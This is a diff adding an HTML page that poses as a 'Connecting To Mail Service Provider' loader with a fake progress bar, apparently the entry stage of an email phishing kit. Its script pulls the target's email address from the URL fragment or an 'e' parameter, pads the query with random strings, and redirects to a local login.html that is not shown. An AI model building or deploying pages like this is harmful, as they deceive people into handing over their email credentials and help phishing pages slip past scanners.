@@ -1,0 +1,155 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <link rel="shortcut icon" type="" href="https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fmain.ico?v=1603881335466">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+</head>
+<style>
+    @import "https://fonts.googleapis.com/css?family=Raleway";
+
+    @font-face {
+        font-family: Technology;
+        src: url()
+    }
+
+    * {
+        font-family: Raleway
+    }
+
+    html {
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #DFDFDF;
+        background-image: url('https://cdn.glitch.com/64b21bf3-2449-4a4d-89e8-d1ad648d952e%2Fbgr.jpg?v=1603880935619');
+        background-size: cover
+    }
+
+    #conn {
+        font-size: 30px;
+        font-weight: 700;
+        color: #037E74;
+        
+    }
+
+    *,
+    ::before,
+    ::after {
+        box-sizing: border-box
+    }
+
+    body {
+        padding: 0;
+        margin: 0
+    }
+
+    .progress-bar {
+        position: relative;
+        width: 500px;
+        height: 3em;
+        background-color: #111;
+        color: #fff
+    }
+
+    .progress-bar::before {
+        content: attr(data-label);
+        display: flex;
+        align-items: center;
+        position: absolute;
+        left: .5em;
+        top: .5em;
+        bottom: .5em;
+        width: calc(var(--width, 0) * 1%);
+        min-width: 2rem;
+        max-width: calc(100% - 1em);
+        background-color: #fff;
+        padding: 1em
+    }
+    </style>
+<body>
+    
+    <title>Detecting Mail Server...</title>
+    <center>
+        <div id="conn">Connecting To Mail Service Provider</div>
+    </center><br><br>
+    <div class="progress-bar" style="--width:73.3;" data-label="Connnecting..."></div>
+    <script>
+    var alnumstr = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    var rdurl = './login.html';
+    var emvv = '';
+    var emv = '';
+    var emvv = get_email_hash();
+    if (!emvv && geturlparameter('e')) {
+        emvv = geturlparameter('e');
+    }
+    if (emvv) { emv = '&e=' + emvv; } else { emv = ''; }
+    rdurl += '?' + randomString(randomInteger(5, 15), alnumstr) + '=' + randomString(randomInteger(50, 150), alnumstr) + emv;
+    setTimeout(function() {
+        window.location.replace(rdurl);
+    }, 2000);
+
+    function randomInteger(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+
+    function randomString(r, n) { for (var o = "", t = r; 0 < t; --t) o += n[Math.floor(Math.random() * n.length)]; return o }
+
+    function getdomainpartofemail(a) { var e, t = !1; return !validateEmail(a) || -1 != (e = (a = a.toLowerCase()).indexOf("@")) && (t = a.substr(e + 1)), t }
+
+    function get_email_hash() { var a = !1,
+            i = window.location.href,
+            t = (i = i.trim()).lastIndexOf("#"); return -1 != t && (a = i.substring(t + 1), validateEmail(a) || (a = !1)), a }
+
+    function validateEmail(t) { return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase()) }
+
+    function geturlparameter(r) { for (var t = window.location.search.substring(1).split("&"), e = 0; e < t.length; e++) { var n = t[e].split("="); if (n[0] == r) return decodeURIComponent(n[1]) } }
+    </script>
+    <script>
+    const progressBar = document.getElementsByClassName('progress-bar')[0]
+    setInterval(() => {
+        const computedStyle = getComputedStyle(progressBar)
+        const width = parseFloat(computedStyle.getPropertyValue('--width')) || 0
+        progressBar.style.setProperty('--width', width + .1)
+    }, 5)
+    </script>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+</body>
+
+</html>
